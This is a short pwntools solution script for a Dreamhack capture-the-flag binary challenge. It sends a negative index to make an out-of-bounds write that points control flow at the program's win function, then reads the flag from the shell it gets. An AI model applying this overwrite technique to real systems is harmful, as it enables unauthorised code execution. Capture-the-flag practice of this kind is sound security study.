#!/usr/bin/env python3
from pwn import *

PORT = 15505
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./prob', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

#GDB()
p.sendlineafter(b"val: ", str((-12) & 0xffffffffffffffff).encode())
p.sendlineafter(b"val: ", str(elf.sym.win).encode())
p.sendline("cat flag")
p.interactive()

'''
Bug:
Out-of-bound
primitive overwrite
'''